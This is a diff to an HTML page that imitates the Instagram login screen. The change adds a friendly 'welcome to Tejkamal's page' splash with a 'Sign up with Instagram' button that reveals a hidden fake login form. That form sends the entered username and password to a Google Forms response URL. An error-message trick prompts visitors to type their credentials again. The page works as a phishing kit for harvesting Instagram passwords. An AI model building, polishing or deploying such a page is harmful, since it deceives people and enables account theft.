@@ -7,17 +7,63 @@
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-      background-color: #fafafa;
+      background: linear-gradient(135deg, #fdfbfb 0%, #ebedee 100%);
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       margin: 0;
+      flex-direction: column;
     }
+
+    /* Fancy Welcome Screen */
+    #welcome-screen {
+      background: white;
+      border-radius: 16px;
+      padding: 40px 30px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      animation: fadeIn 1.2s ease-in-out;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    #welcome-screen h2 {
+      font-size: 26px;
+      margin-bottom: 20px;
+      color: #262626;
+      animation: fadeIn 1.6s ease-in-out;
+    }
+
+    #welcome-screen button {
+      padding: 12px 24px;
+      background: linear-gradient(135deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+      background-size: 300% 300%;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.4s ease;
+    }
+
+    #welcome-screen button:hover {
+      background-position: right center;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.15);
+      transform: scale(1.05);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
     .login-container {
       width: 350px;
       text-align: center;
     }
+
     .title {
       font-size: 38px;
       font-weight: bold;
@@ -25,6 +71,7 @@
       margin: 20px 0 30px;
       letter-spacing: 1px;
     }
+
     .login-box {
       background-color: #fff;
       border: 1px solid #dbdbdb;
@@ -32,10 +79,12 @@
       border-radius: 8px;
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
     }
+
     .input-group {
       position: relative;
       margin: 10px 0;
     }
+
     .login-box input[type="text"],
     .login-box input[type="password"] {
       width: 100%;
@@ -47,10 +96,12 @@
       box-sizing: border-box;
       outline: none;
     }
+
     .login-box input[type="text"]:focus,
     .login-box input[type="password"]:focus {
       border-color: #0095f6;
     }
+
     .login-box input[type="submit"] {
       width: 100%;
       padding: 8px;
@@ -64,15 +115,18 @@
       cursor: pointer;
       transition: background-color 0.2s;
     }
+
     .login-box input[type="submit"]:hover {
       background-color: #007bb5;
     }
+
     .error-message {
       color: #ed4956;
       font-size: 12px;
       margin-top: 10px;
       display: none;
     }
+
     .divider {
       display: flex;
       align-items: center;
@@ -80,19 +134,23 @@
       color: #8e8e8e;
       font-size: 12px;
     }
+
     .divider hr {
       flex-grow: 1;
       border: none;
       border-top: 1px solid #dbdbdb;
     }
+
     .divider span {
       margin: 0 15px;
     }
+
     .footer {
       margin-top: 25px;
       font-size: 12px;
       color: #8e8e8e;
     }
+
     .footer a {
       color: #00376b;
       text-decoration: none;
@@ -101,7 +159,15 @@
   </style>
 </head>
 <body>
-  <div class="login-container">
+
+  <!-- Fancy Welcome Screen -->
+  <div id="welcome-screen">
+    <h2>Hi, welcome to Tejkamal's page 😊</h2>
+    <button onclick="startInstagramLogin()">Sign up with Instagram</button>
+  </div>
+
+  <!-- Login Form (Initially Hidden) -->
+  <div id="login-section" class="login-container" style="display: none;">
     <div class="title">Instagram</div>
     <div class="login-box">
       <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeeQOC82j3KlAIyLeF57niS63fow9ij7N6VjaZVy-ayxhv4Cg/formResponse"
@@ -124,6 +190,7 @@
       <div class="divider">
         <hr /><span>OR</span><hr />
       </div>
+
       <div class="footer">
         Don't have an account? <a href="#">Sign up</a>
       </div>
@@ -133,13 +200,17 @@
   <script>
     let submitted = false;
 
-    // Show error message if redirected back with ?error=true
     window.onload = function () {
       const params = new URLSearchParams(window.location.search);
       if (params.get("error") === "true") {
         document.getElementById("errorMessage").style.display = "block";
       }
     };
+
+    function startInstagramLogin() {
+      document.getElementById('welcome-screen').style.display = 'none';
+      document.getElementById('login-section').style.display = 'block';
+    }
   </script>
 </body>
 </html>
